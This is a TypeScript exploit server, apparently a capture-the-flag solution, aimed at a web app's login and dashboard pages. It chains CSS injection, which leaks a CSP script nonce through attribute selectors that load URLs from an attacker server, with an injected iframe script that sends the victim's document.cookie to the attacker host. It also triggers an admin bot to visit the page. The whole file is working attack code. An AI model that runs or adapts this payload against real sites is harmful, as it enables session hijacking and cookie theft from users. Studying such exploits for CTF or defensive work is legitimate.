import { Hono } from "hono"
import { join } from "node:path"
import { stream, streamSSE } from 'hono/streaming'

const app = new Hono()

const CHALL_URI = "http://localhost:3000"
const ATTACKER_URI = "http://localhost:1337"
const MAX_TIMED_OUT_S = 70
const NONCE_LEN = 32

let set = false
let nonce_l = ''
let nonce_r = ''
let full_nonce = ''

app.get('/r', (c) => {
  c.header('Access-Control-Allow-Origin', '*')
  const l = c.req.query('l')
  const r = c.req.query('r')
  const flag = c.req.query('flag')!
  if (l && set) nonce_l = l.trim()
  if (r && set) nonce_r = r.trim()
  if (flag) console.log(`[SUCCESS] cookie is ${decodeURIComponent(flag)}`)
  return c.text('ok')
})

app.get('/set', (c) => {
  c.header('Access-Control-Allow-Origin', '*')
  set = true
  return c.text('ok')
})

function buildCssPayload(n: number) {
  const charset = '1234567890abcdef'.split('')
  const weight = '[nonce]'.repeat(n)
  const leak_nonce_payload = `@import url(${ATTACKER_URI}/p?len=${n + 1});
${charset.map(c => `script${weight}[nonce^="${nonce_l}${c}"]{
  background: url(${ATTACKER_URI}/r?l=${nonce_l}${c})
}`).join('\n')}
${charset.map(c => `script${weight}[nonce$="${c}${nonce_r}"]{
  mask-image: url(${ATTACKER_URI}/r?r=${c}${nonce_r})
}`).join('\n')}`
  return leak_nonce_payload
}

app.get('/p', (c) => {
  if ((nonce_l + nonce_r).length === NONCE_LEN) {
    full_nonce = nonce_l + nonce_r
    console.log(`[LEAKED] nonce: ${full_nonce}`)
    return c.html('/* ok */')
  }
  c.header("Content-Type", "text/css")
  const targetLen = Number(c.req.query('len') || 0)
  return stream(c, async (s) => {
    const start = Date.now()
    while (Date.now() - start < MAX_TIMED_OUT_S * 1000) {
      if (nonce_l.length + 1 === targetLen && nonce_r.length + 1 === targetLen) {
        await s.write(buildCssPayload(targetLen))
        return
      }
      await s.sleep(50)
    }
    await s.write(`/* end ${targetLen} */\n`)
  })
})

app.get('/sse', async (c) => {
  return streamSSE(c, async (stream) => {
    while (true) {
      if (full_nonce) {
        await stream.writeSSE({
          data: full_nonce,
          event: 'nonce'
        })
        await stream.close()
        stream.abort()
      }
      await stream.sleep(500)
    }
  })
})

app.get('/', (c) => {
  let cssi_payload = '<style>script{display:block!important;}</style>\n'
  cssi_payload += `<style>@import url(${ATTACKER_URI}/p?len=1);</style>\n`
  return c.html(`
  <h1>Exploit</h1>
  <form action="${CHALL_URI}/login" method="post" id="form" target="w">
    <input type="hidden" name="name" id="input">
  </form>
  <form action="${CHALL_URI}/login" method="post" id="form2" target="t">
    <input type="hidden" name="name" id="input2">
  </form>
  <script>
    (async function(){
      const w = open('', 'w')
      const sleep = t => new Promise(r => setTimeout(r, t))
      // set payload
      input.value = \`pwner<\\/b>\\n${cssi_payload}<b>!\`
      form.submit()
      await sleep(1000)
      await fetch("${ATTACKER_URI}/set")
      w.location = "${CHALL_URI}/dashboard?xss"
      const sse = new EventSource("/sse")
      sse.addEventListener("nonce", async (e) => {
        sse.removeEventListener("nonce", null)
        sse.close()
        // iframe reparenting payload
        input2.value = \`pwner<\\/b>\\n<iframe srcdoc='<script nonce="\${e.data}">fetch("${ATTACKER_URI}/r?flag="+encodeURIComponent(document.cookie))<\\/script>'></iframe><b>!\`
        form2.submit()
        await sleep(1000)
        w.location = URL.createObjectURL(new Blob([\`
          <script>setTimeout(()=>history.go(-1), 1000)<\\/script>
        \`], { type: "text/html" }))
      })
    })()
  </script>
  `)
})

Bun.serve({
  fetch: app.fetch,
  port: 1337,
  idleTimeout: MAX_TIMED_OUT_S
})

async function visit(url: string) {
  await Bun.$`node adminbot.js ${url}`.cwd(join(__dirname, '..'))
}

await visit(ATTACKER_URI)

console.log('[END] bot visited')
